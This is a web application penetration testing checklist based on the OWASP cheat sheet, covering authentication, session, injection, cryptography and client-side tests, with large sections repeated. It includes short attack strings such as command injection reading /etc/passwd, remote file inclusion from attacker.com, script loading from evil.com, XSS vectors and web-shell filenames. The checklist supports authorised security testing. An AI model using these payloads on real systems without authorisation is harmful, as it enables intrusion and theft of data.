- [ ]-IDENT-005	Testing for Weak or unenforced username policy	"User account names are often highly structured (e.g. Joe Bloggs
account name is jbloggs and Fred Nurks account name is fnurks)
and valid account names can easily be guessed."	Browser, Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-006	Test Permissions of Guest/Training Accounts	Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorisation process required for access.Evaluate consistency between access policy and guest/training account access permissions.	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-007	Test Account Suspension/Resumption Process	Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.	Burp Proxy, ZAP	Not Started	
					
Authentication Testing	Test Name	Description	Tools	Result	Remark
- [ ]-AUTHN-001	Testing for Credentials Transported over an Encrypted Channel	Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-002	Testing for default credentials	Testing for default credentials of common applications, Testing for default password of new accounts.	Burp Proxy, ZAP, Hydra	Not Started	
- [ ]-AUTHN-003	Testing for Weak lock out mechanism	"Evaluate the account lockout mechanism’s ability to mitigate
brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking."	Browser	Not Started	
- [ ]-AUTHN-004	Testing for bypassing authentication schema	Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-005	Test remember password functionality	Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-006	Testing for Browser cache weakness	Check browser history issue by clicking "Back" button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)	Burp Proxy, ZAP, Firefox add-on CacheViewer2	Not Started	
- [ ]-AUTHN-007	Testing for Weak password policy	"Determine the resistance of the application against brute force
password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of
passwords."	Burp Proxy, ZAP, Hydra	Not Started	
- [ ]-AUTHN-008	Testing for Weak security question/answer	Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)	Browser	Not Started	
- [ ]-AUTHN-009	Testing for weak password change or reset functionalities	Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?	Browser, Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-010	Testing for Weaker authentication in alternative channel	Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)	Browser	Not Started	
					
Authorization Testing 	Test Name	Description	Tools	Result	Remark
- [ ]-AUTHZ-001	Testing Directory traversal/file include	dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.	Burp Proxy, ZAP, Wfuzz	Not Started	
- [ ]-AUTHZ-002	Testing for bypassing authorization schema	Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)	Burp Proxy (Autorize), ZAP	Not Started	
- [ ]-AUTHZ-003	Testing for Privilege Escalation	Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1	Burp Proxy (Autorize), ZAP	Not Started	
- [ ]-AUTHZ-004	Testing for Insecure Direct Object References	Force changing parameter value (?invoice=123 -> ?invoice=456)	Burp Proxy (Autorize), ZAP	Not Started	
					
Session Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-SESS-001	Testing for Bypassing Session Management Schema	SessionID analysis prediction, unencrypted cookie transport, brute-force.	Burp Proxy, ForceSSL, ZAP, CookieDigger	Not Started	
- [ ]-SESS-002	Testing for Cookies attributes	Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-003	Testing for Session Fixation	The application doesn't renew the cookie after a successfully user authentication.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-004	Testing for Exposed Session Variables	Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-005	Testing for Cross Site Request Forgery	URL analysis, Direct access to functions without any token.	Burp Proxy (csrf_token_detect), burpy, ZAP	Not Started	
- [ ]-SESS-006	Testing for logout functionality	Check reuse session after logout both server-side and SSO.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-007	Test Session Timeout	Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-008	Testing for Session puzzling	The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.	Burp Proxy, ZAP	Not Started	
					
Data Validation Testing	Test Name	Description	Tools	Result	Remark
- [ ]-INPVAL-001	Testing for Reflected Cross Site Scripting	Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.	Burp Proxy, ZAP, Xenotix XSS	Not Started	
- [ ]-INPVAL-002	Testing for Stored Cross Site Scripting	Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF	Burp Proxy, ZAP, BeEF, XSS Proxy	Not Started	
- [ ]-INPVAL-003	Testing for HTTP Verb Tampering	Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.	netcat	Not Started	
- [ ]-INPVAL-004	Testing for HTTP Parameter pollution	Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP	ZAP, HPP Finder (Chrome Plugin)	Not Started	
- [ ]-INPVAL-005	Testing for SQL Injection	Union, Boolean, Error based, Out-of-band, Time delay.	Burp Proxy (SQLipy), SQLMap, Pangolin, Seclists (FuzzDB)	Not Started	
	Oracle Testing	Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection	Orascan, SQLInjector	Not Started	
	MySQL Testing	Identify MySQL version, Single quote, Information_schema, Read/Write file.	SQLMap, Mysqloit, Power Injector	Not Started	
	SQL Server Testing	Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)	SQLMap, SQLninja, Power Injector	Not Started	
	Testing PostgreSQL	Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)	SQLMap	Not Started	
	MS Access Testing	Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.	SQLMap	Not Started	
	Testing for NoSQL injection	Identify NoSQL databases, Pass special characters (' " \ ; { } ), Attack with reserved variable name, operator.	NoSQLMap	Not Started	
- [ ]-INPVAL-006	Testing for LDAP Injection	"/ldapsearch?user=*
user=*user=*)(uid=*))(|(uid=*
pass=password"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-007	Testing for ORM Injection	Testing ORM injection is identical to SQL injection testing	Hibernate, Nhibernate	Not Started	
- [ ]-INPVAL-008	Testing for XML Injection	"Check with XML Meta Characters
', "" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG"	Burp Proxy, ZAP, Wfuzz	Not Started	
- [ ]-INPVAL-009	Testing for SSI Injection	"• Presense of .shtml extension
• Check for these characters
< ! # = / . "" - > and [a-zA-Z0-9]
• include String = <!--#include virtual=""/etc/passwd"" -->"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-010	Testing for XPath Injection	"Check for XML error enumeration by supplying a single quote (')
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-011	IMAP/SMTP Injection	"• Identifying vulnerable parameters with special characters
(i.e.: \, ‘, “, @, #, !, |)
• Understanding the data flow and deployment structure of the client
• IMAP/SMTP command injection (Header, Body, Footer)"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-012	Testing for Code Injection	"Enter OS commands in the input field.
?arg=1; system('id')"	Burp Proxy, ZAP, Liffy, Panoptic	Not Started	
	Testing for Local File Inclusion	LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)	Burp Proxy, fimap, Liffy	Not Started	
	Testing for Remote File Inclusion	"RFI from malicious URL
?page.php?file=http://attacker.com/malicious_page"	Burp Proxy, fimap, Liffy	Not Started	
- [ ]-INPVAL-013	Testing for Command Injection	"Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.
%3Bcat%20/etc/passwd
test.pdf+|+Dir C:\"	Burp Proxy, ZAP, Commix	Not Started	
- [ ]-INPVAL-014	Testing for Buffer overflow	"• Testing for heap overflow vulnerability
• Testing for stack overflow vulnerability
• Testing for format string vulnerability"	Immunity Canvas, Spike, MSF, Nessus	Not Started	
	Testing for Heap overflow			Not Started	
	Testing for Stack overflow			Not Started	
	Testing for Format string			Not Started	
- [ ]-INPVAL-015	Testing for incubated vulnerabilities	File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)	Burp Proxy, BeEF, MSF	Not Started	
- [ ]-INPVAL-016	Testing for HTTP Splitting/Smuggling	param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>	Burp Proxy, ZAP, netcat	Not Started	
					
Error Handling	Test Name	Description	Tools	Result	Remark
- [ ]-ERR-001	Analysis of Error Codes	Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)	Burp Proxy, ZAP	Not Started	
- [ ]-ERR-002	Analysis of Stack Traces	"• Invalid Input / Empty inputs
• Input that contains non alphanumeric characters or query syn
tax
• Access to internal pages without authentication
• Bypassing application flow"	Burp Proxy, ZAP	Not Started	
					
Cryptography	Test Name	Description	Tools	Result	Remark
- [ ]-CRYPST-001	Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection	Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)	testssl.sh, SSL Breacher	Not Started	
- [ ]-CRYPST-002	Testing for Padding Oracle	"Compare the responses in three different states:
• Cipher text gets decrypted, resulting data is correct.
• Cipher text gets decrypted, resulting data is garbled and causes
some exception or error handling in the application logic.
• Cipher text decryption fails due to padding errors."	PadBuster, Poracle, python-paddingoracle, POET	Not Started	
- [ ]-CRYPST-003	Testing for Sensitive information sent via unencrypted channels	"Check sensitive data during the transmission:
• Information used in authentication (e.g. Credentials, PINs, Session
identifiers, Tokens, Cookies…)
• Information protected by laws, regulations or specific organizational
policy (e.g. Credit Cards, Customers data)"	Burp Proxy, ZAP, Curl	Not Started	
					
Business logic Testing	Test Name	Description	Tools	Result	Remark
- [ ]-BUSLOGIC-001	Test Business Logic Data Validation	"• Looking for data entry points or hand off points between systems or software.
• Once found try to insert logically invalid data into the application/system. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-002	Test Ability to Forge Requests	"• Looking for guessable, predictable or hidden functionality of fields.
• Once found try to insert logically valid data into the application/system allowing the user go through the application/system against the normal busineess logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-003	Test Integrity Checks	"•Looking for parts of the application/system (components i.e. For example, input fields, databases or logs) that move, store or handle data/information.
• For each identified component determine what type of data/information is logically acceptable and what types the application/system should guard against. Also, consider who according to the business logic is allowed to insert, update and delete data/information and in each component.
• Attempt to insert, update or edit delete the data/information values with invalid data/information into each component (i.e. input, database, or log) by users that .should not be allowed per the busines logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-004	Test for Process Timing	"• Looking for application/system functionality that may
be impacted by time. Such as execution time or actions that
help users predict a future outcome or allow one to circumvent
any part of the business logic or workflow. For example, not
completing transactions in an expected time.
• Develop and execute the mis-use cases ensuring that attackers
can not gain an advantage based on any timing."	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-005	Test Number of Times a Function Can be Used Limits	"• Looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.
• For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times."	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-006	Testing for the Circumvention of Work Flows	"• Looking for methods to skip or go to steps in the application process in a different order from the designed/intended business logic flow.
• For each method develop a misuse case and try to circumvent or perform an action that is ""not acceptable"" per the the business logic workflow. "	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-007	Test Defenses Against Application Mis-use	"Measures that might indicate the application has in-built self-defense:
• Changed responses
• Blocked requests
• Actions that log a user out or lock their account"	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-008	Test Upload of Unexpected File Types	"• Review the project documentation and perform some exploratory testing looking for file types that should be ""unsupported"" by the application/system.
• Try to upload these “unsupported” files an verify that it are properly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. 
PS. file.phtml, shell.phPWND, SHELL~1.PHP"	Burp Proxy, ZAP	Not Started	
- [ ]-BUSLOGIC-009	Test Upload of Malicious Files	"• Develop or acquire a known “malicious” file.
• Try to upload the malicious file to the application/system and verify that it is correctly rejected.
• If multiple files can be uploaded at once, there must be tests in place to verify that each file is properly evaluated. "	Burp Proxy, ZAP	Not Started	
					
Client Side Testing	Test Name	Description	Tools	Result	Remark
- [ ]-CLIENT-001	Testing for DOM based Cross Site Scripting	Test for the user inputs obtained from client-side JavaScript Objects	Burp Proxy, DOMinator	Not Started	
- [ ]-CLIENT-002	Testing for JavaScript Execution	"Inject JavaScript code:
www.victim.com/?javascript:alert(1)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-003	Testing for HTML Injection	"Send malicious HTML code:
?user=<img%20src='aaa'%20onerror=alert(1)>"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-004	Testing for Client Side URL Redirect	"Modify untrusted URL input to a malicious site: (Open Redirect)
?redirect=www.fake-target.site "	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-005	Testing for CSS Injection	"Inject code in the CSS context :
•  www.victim.com/#red;-o-link:'javascript:alert(1)';-o-link-source:current; (Opera [8,12])
•  www.victim.com/#red;-:expression(alert(URL=1)); (IE 7/8)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-006	Testing for Client Side Resource Manipulation	"External JavaScript could be easily injected in the trusted web site
www.victim.com/#http://evil.com/js.js"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-007	Test Cross Origin Resource Sharing	"Check the HTTP headers in order to understand how CORS is
used (Origin Header)"	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-008	Testing for Cross Site Flashing	Decompile, Undefined variables, Unsafe methods, Include malicious SWF (http://victim/file.swf?lang=http://evil	FlashBang, Flare, Flasm, SWFScan, SWF Intruder	Not Started	
- [ ]-CLIENT-009	Testing for Clickjacking	Discover if a website is vulnerable by loading into an iframe, create simple web page that includes a frame containing the target.	Burp Proxy, ClickjackingTool	Not Started	
- [ ]-CLIENT-010	Testing WebSockets	Identify that the application is using WebSockets by inspecting ws:// or wss:// URI scheme.Use Google Chrome's Developer Tools to view the Network WebSocket communication. Check Origin, Confidentiality and Integrity, Authentication, Authorization, Input Sanitization	Burp Proxy, Chrome, ZAP, WebSocket Client	Not Started	
- [ ]-CLIENT-011	Test Web Messaging	Analyse JavaScript code looking for how Web Messaging is implemented. How the website is restricting messages from untrusted domain and how the data is handled even for trusted domains	Burp Proxy, ZAP	Not Started	
- [ ]-CLIENT-012	Test Local Storage	"Determine whether the website is storing sensitive data in the storage. XSS in localstorage 
http://server/StoragePOC.html#<img src=x onerror=alert(1)>"	Chrome, Firebug, Burp Proxy, ZAP	Not Started	
 

Source:  
[OWASP](https://www.owasp.org/index.php/Web_Application_Security_Testing_Cheat_Sheet)  
[0xpatrick subdomain enumeration workflow](https://0xpatrik.com/subdomain-enumeration-2019/)




- [ ]-INFO-001	Conduct Search Engine Discovery and Reconnaissance for Information Leakage	Use a search engine to search for Network diagrams and Configurations, Credentials, Error message content.	Google Hacking, Sitedigger, Shodan, FOCA, Punkspider	Not Started	
- [ ]-INFO-002	Fingerprint Web Server	"Find the version and type of a running web server to determine known vulnerabilities and the appropriate exploits. Using
""HTTP header field ordering"" and ""Malformed requests test""."	Httprint, Httprecon, Desenmascarame	Not Started	
- [ ]-INFO-003	Review Webserver Metafiles for Information Leakage	Analyze robots.txt and identify <META> Tags from website.	Browser, curl, wget	Not Started	
- [ ]-INFO-004	Enumerate Applications on Webserver	Find applications hosted in the webserver (Virtual hosts/Subdomain), non-standard ports, DNS zone transfers	Webhosting.info, dnsrecon, Nmap, fierce, Recon-ng, Intrigue	Not Started	
- [ ]-INFO-005	Review Webpage Comments and Metadata for Information Leakage	Find sensitive information from webpage comments and Metadata on source code.	Browser, curl, wget	Not Started	
- [ ]-INFO-006	Identify application entry points	Identify from hidden fields, parameters, methods HTTP header analysis	Burp proxy, ZAP, Tamper data	Not Started	
- [ ]-INFO-007	Map execution paths through application	Map the target application and understand the principal workflows.	Burp proxy, ZAP	Not Started	
- [ ]-INFO-008	Fingerprint Web Application Framework	Find the type of web application framework/CMS from HTTP headers, Cookies, Source code, Specific files and folders.	Whatweb, BlindElephant, Wappalyzer	Not Started	
- [ ]-INFO-009	Fingerprint Web Application	Identify the web application and version to determine known vulnerabilities and the appropriate exploits.	Whatweb, BlindElephant, Wappalyzer, CMSmap	Not Started	
- [ ]-INFO-010	Map Application Architecture	Identify application architecture including Web language, WAF, Reverse proxy, Application Server, Backend Database	Browser, curl, wget	Not Started	
					
Configuration and Deploy Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-CONFIG-001	Test Network/Infrastructure Configuration	Understand the infrastructure elements interactions, config management for software, backend DB server, WebDAV, FTP in order to identify known vulnerabilities.	Nessus	Not Started	
- [ ]-CONFIG-002	Test Application Platform Configuration	Identify default installation file/directory, Handle Server errors (40*,50*), Minimal Privilege, Software logging.	Browser, Nikto	Not Started	
- [ ]-CONFIG-003	Test File Extensions Handling for Sensitive Information	Find important file, information (.asa , .inc , .sql ,zip, tar, pdf, txt, etc)	Browser, Nikto	Not Started	
- [ ]-CONFIG-004	Backup and Unreferenced Files for Sensitive Information	Check JS source code, comments, cache file, backup file (.old, .bak, .inc, .src) and guessing of filename	Nessus, Nikto, Wikto	Not Started	
- [ ]-CONFIG-005	Enumerate Infrastructure and Application Admin Interfaces	Directory and file enumeration, comments and links in source (/admin, /administrator, /backoffice, /backend, etc), alternative server port (Tomcat/8080)	Burp Proxy, dirb, Dirbuster, fuzzdb, Tilde Scanner	Not Started	
- [ ]-CONFIG-006	Test HTTP Methods	Identify HTTP allowed methods on Web server with OPTIONS. Arbitrary HTTP Methods, HEAD access control bypass and XST	netcat, curl	Not Started	
- [ ]-CONFIG-007	Test HTTP Strict Transport Security	"Identify HSTS header on Web server through HTTP response header. 
curl -s -D- https://domain.com/ | grep Strict"	Burp Proxy, ZAP, curl	Not Started	
- [ ]-CONFIG-008	Test RIA cross domain policy	Analyse the permissions allowed from the policy files (crossdomain.xml/clientaccesspolicy.xml) and allow-access-from.	Burp Proxy, ZAP, Nikto	Not Started	
					
Identity Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-IDENT-001	Test Role Definitions	Validate the system roles defined within the application by creating permission matrix.	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-002	Test User Registration Process	"Verify that the identity requirements for user registration are aligned
with business and security requirements:"	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-003	Test Account Provisioning Process	"Determine which roles are able to provision users and what sort of
accounts they can provision."	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-004	Testing for Account Enumeration and Guessable User Account	Generic login error statement check, return codes/parameter values, enumerate all possible valid userids (Login system, Forgot password)	Browser, Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-005	Testing for Weak or unenforced username policy	"User account names are often highly structured (e.g. Joe Bloggs
account name is jbloggs and Fred Nurks account name is fnurks)
and valid account names can easily be guessed."	Browser, Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-006	Test Permissions of Guest/Training Accounts	Guest and Training accounts are useful ways to acquaint potential users with system functionality prior to them completing the authorisation process required for access.Evaluate consistency between access policy and guest/training account access permissions.	Burp Proxy, ZAP	Not Started	
- [ ]-IDENT-007	Test Account Suspension/Resumption Process	Verify the identity requirements for user registration align with business/security requirements. Validate the registration process.	Burp Proxy, ZAP	Not Started	
					
Authentication Testing	Test Name	Description	Tools	Result	Remark
- [ ]-AUTHN-001	Testing for Credentials Transported over an Encrypted Channel	Check referrer whether its HTTP or HTTPs. Sending data through HTTP and HTTPS.	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-002	Testing for default credentials	Testing for default credentials of common applications, Testing for default password of new accounts.	Burp Proxy, ZAP, Hydra	Not Started	
- [ ]-AUTHN-003	Testing for Weak lock out mechanism	"Evaluate the account lockout mechanism’s ability to mitigate
brute force password guessing. Evaluate the unlock mechanism’s resistance to unauthorized account unlocking."	Browser	Not Started	
- [ ]-AUTHN-004	Testing for bypassing authentication schema	Force browsing (/admin/main.php, /page.asp?authenticated=yes), Parameter Modification, Session ID prediction, SQL Injection	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-005	Test remember password functionality	Look for passwords being stored in a cookie. Examine the cookies stored by the application. Verify that the credentials are not stored in clear text, but are hashed. Autocompleted=off?	Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-006	Testing for Browser cache weakness	Check browser history issue by clicking "Back" button after logging out. Check browser cache issue from HTTP response headers (Cache-Control: no-cache)	Burp Proxy, ZAP, Firefox add-on CacheViewer2	Not Started	
- [ ]-AUTHN-007	Testing for Weak password policy	"Determine the resistance of the application against brute force
password guessing using available password dictionaries by evaluating the length, complexity, reuse and aging requirements of
passwords."	Burp Proxy, ZAP, Hydra	Not Started	
- [ ]-AUTHN-008	Testing for Weak security question/answer	Testing for weak pre-generated questions, Testing for weak self-generated question, Testing for brute-forcible answers (Unlimited attempts?)	Browser	Not Started	
- [ ]-AUTHN-009	Testing for weak password change or reset functionalities	Test password reset (Display old password in plain-text?, Send via email?, Random token on confirmation email ?), Test password change (Need old password?), CSRF vulnerability ?	Browser, Burp Proxy, ZAP	Not Started	
- [ ]-AUTHN-010	Testing for Weaker authentication in alternative channel	Understand the primary mechanism and Identify other channels (Mobile App, Call center, SSO)	Browser	Not Started	
					
Authorization Testing 	Test Name	Description	Tools	Result	Remark
- [ ]-AUTHZ-001	Testing Directory traversal/file include	dot-dot-slash attack (../), Directory traversal, Local File inclusion/Remote File Inclusion.	Burp Proxy, ZAP, Wfuzz	Not Started	
- [ ]-AUTHZ-002	Testing for bypassing authorization schema	Access a resource without authentication?, Bypass ACL, Force browsing (/admin/adduser.jsp)	Burp Proxy (Autorize), ZAP	Not Started	
- [ ]-AUTHZ-003	Testing for Privilege Escalation	Testing for role/privilege manipulate the values of hidden variables. Change some param groupid=2 to groupid=1	Burp Proxy (Autorize), ZAP	Not Started	
- [ ]-AUTHZ-004	Testing for Insecure Direct Object References	Force changing parameter value (?invoice=123 -> ?invoice=456)	Burp Proxy (Autorize), ZAP	Not Started	
					
Session Management Testing	Test Name	Description	Tools	Result	Remark
- [ ]-SESS-001	Testing for Bypassing Session Management Schema	SessionID analysis prediction, unencrypted cookie transport, brute-force.	Burp Proxy, ForceSSL, ZAP, CookieDigger	Not Started	
- [ ]-SESS-002	Testing for Cookies attributes	Check HTTPOnly and Secure flag, expiration, inspect for sensitive data.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-003	Testing for Session Fixation	The application doesn't renew the cookie after a successfully user authentication.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-004	Testing for Exposed Session Variables	Encryption & Reuse of session Tokens vulnerabilities, Send sessionID with GET method ?	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-005	Testing for Cross Site Request Forgery	URL analysis, Direct access to functions without any token.	Burp Proxy (csrf_token_detect), burpy, ZAP	Not Started	
- [ ]-SESS-006	Testing for logout functionality	Check reuse session after logout both server-side and SSO.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-007	Test Session Timeout	Check session timeout, after the timeout has passed, all session tokens should be destroyed or be unusable.	Burp Proxy, ZAP	Not Started	
- [ ]-SESS-008	Testing for Session puzzling	The application uses the same session variable for more than one purpose. An attacker can potentially access pages in an order unanticipated by the developers so that the session variable is set in one context and then used in another.	Burp Proxy, ZAP	Not Started	
					
Data Validation Testing	Test Name	Description	Tools	Result	Remark
- [ ]-INPVAL-001	Testing for Reflected Cross Site Scripting	Check for input validation, Replace the vector used to identify XSS, XSS with HTTP Parameter Pollution.	Burp Proxy, ZAP, Xenotix XSS	Not Started	
- [ ]-INPVAL-002	Testing for Stored Cross Site Scripting	Check input forms/Upload forms and analyze HTML codes, Leverage XSS with BeEF	Burp Proxy, ZAP, BeEF, XSS Proxy	Not Started	
- [ ]-INPVAL-003	Testing for HTTP Verb Tampering	Craft custom HTTP requests to test the other methods to bypass URL authentication and authorization.	netcat	Not Started	
- [ ]-INPVAL-004	Testing for HTTP Parameter pollution	Identify any form or action that allows user-supplied input to bypass Input validation and filters using HPP	ZAP, HPP Finder (Chrome Plugin)	Not Started	
- [ ]-INPVAL-005	Testing for SQL Injection	Union, Boolean, Error based, Out-of-band, Time delay.	Burp Proxy (SQLipy), SQLMap, Pangolin, Seclists (FuzzDB)	Not Started	
	Oracle Testing	Identify URLs for PL/SQL web applications, Access with PL/SQL Packages, Bypass PL/SQL Exclusion list, SQL Injection	Orascan, SQLInjector	Not Started	
	MySQL Testing	Identify MySQL version, Single quote, Information_schema, Read/Write file.	SQLMap, Mysqloit, Power Injector	Not Started	
	SQL Server Testing	Comment operator (- -), Query separator (;), Stored procedures (xp_cmdshell)	SQLMap, SQLninja, Power Injector	Not Started	
	Testing PostgreSQL	Determine that the backend database engine is PostgreSQL by using the :: cast operator. Read/Write file, Shell Injection (OS command)	SQLMap	Not Started	
	MS Access Testing	Enumerate the column through error-based (Group by), Obtain database schema combine with fuzzdb.	SQLMap	Not Started	
	Testing for NoSQL injection	Identify NoSQL databases, Pass special characters (' " \ ; { } ), Attack with reserved variable name, operator.	NoSQLMap	Not Started	
- [ ]-INPVAL-006	Testing for LDAP Injection	"/ldapsearch?user=*
user=*user=*)(uid=*))(|(uid=*
pass=password"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-007	Testing for ORM Injection	Testing ORM injection is identical to SQL injection testing	Hibernate, Nhibernate	Not Started	
- [ ]-INPVAL-008	Testing for XML Injection	"Check with XML Meta Characters
', "" , <>, <!--/-->, &, <![CDATA[ / ]]>, XXE, TAG"	Burp Proxy, ZAP, Wfuzz	Not Started	
- [ ]-INPVAL-009	Testing for SSI Injection	"• Presense of .shtml extension
• Check for these characters
< ! # = / . "" - > and [a-zA-Z0-9]
• include String = <!--#include virtual=""/etc/passwd"" -->"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-010	Testing for XPath Injection	"Check for XML error enumeration by supplying a single quote (')
Username: ‘ or ‘1’ = ‘1
Password: ‘ or ‘1’ = ‘1"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-011	IMAP/SMTP Injection	"• Identifying vulnerable parameters with special characters
(i.e.: \, ‘, “, @, #, !, |)
• Understanding the data flow and deployment structure of the client
• IMAP/SMTP command injection (Header, Body, Footer)"	Burp Proxy, ZAP	Not Started	
- [ ]-INPVAL-012	Testing for Code Injection	"Enter OS commands in the input field.
?arg=1; system('id')"	Burp Proxy, ZAP, Liffy, Panoptic	Not Started	
	Testing for Local File Inclusion	LFI with dot-dot-slash (../../), PHP Wrapper (php://filter/convert.base64-encode/resource)	Burp Proxy, fimap, Liffy	Not Started	
	Testing for Remote File Inclusion	"RFI from malicious URL
?page.php?file=http://attacker.com/malicious_page"	Burp Proxy, fimap, Liffy	Not Started	
- [ ]-INPVAL-013	Testing for Command Injection	"Understand the application platform, OS, folder structure, relative path and execute OS commands on a Web server.
%3Bcat%20/etc/passwd
test.pdf+|+Dir C:\"	Burp Proxy, ZAP, Commix	Not Started	
- [ ]-INPVAL-014	Testing for Buffer overflow	"• Testing for heap overflow vulnerability
• Testing for stack overflow vulnerability
• Testing for format string vulnerability"	Immunity Canvas, Spike, MSF, Nessus	Not Started	
	Testing for Heap overflow			Not Started	
	Testing for Stack overflow			Not Started	
	Testing for Format string			Not Started	
- [ ]-INPVAL-015	Testing for incubated vulnerabilities	File Upload, Stored XSS , SQL/XPATH Injection, Misconfigured servers (Tomcat, Plesk, Cpanel)	Burp Proxy, BeEF, MSF	Not Started	
- [ ]-INPVAL-016	Testing for HTTP Splitting/Smuggling	param=foobar%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<html>Sorry,%20System%20Down</html>	Burp Proxy, ZAP, netcat	Not Started	
					
Error Handling	Test Name	Description	Tools	Result	Remark
- [ ]-ERR-001	Analysis of Error Codes	Locate error codes generated from applications or web servers. Collect sensitive information from that errors (Web Server, Application Server, Database)	Burp Proxy, ZAP	Not Started	
- [ ]-ERR-002	Analysis of Stack Traces	"• Invalid Input / Empty inputs
• Input that contains non alphanumeric characters or query syn
tax
• Access to internal pages without authentication
• Bypassing application flow"	Burp Proxy, ZAP	Not Started	
					
Cryptography	Test Name	Description	Tools	Result	Remark
- [ ]-CRYPST-001	Testing for Weak SSL/TSL Ciphers, Insufficient Transport Layer Protection	Identify SSL service, Idectify weak ciphers/protocols (ie. RC4, BEAST, CRIME, POODLE)	testssl.sh, SSL Breacher	Not Started	
- [ ]-CRYPST-002	Testing for Padding Oracle	"Compare the responses in three different states:
• Cipher text gets decrypted, resulting data is correct.
• Cipher text gets decrypted, resulting data is garbled and causes
some exception or error handling in the application logic.
